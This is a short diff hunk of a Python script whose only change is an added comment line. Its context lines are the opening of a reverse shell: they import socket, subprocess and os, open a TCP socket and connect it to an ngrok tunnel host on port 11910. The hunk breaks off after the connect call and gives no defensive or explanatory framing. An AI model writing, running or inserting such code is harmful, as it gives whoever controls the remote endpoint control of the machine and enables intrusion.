@@ -1,3 +1,4 @@
+# Use python3
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("5.tcp.eu.ngrok.io",11910))
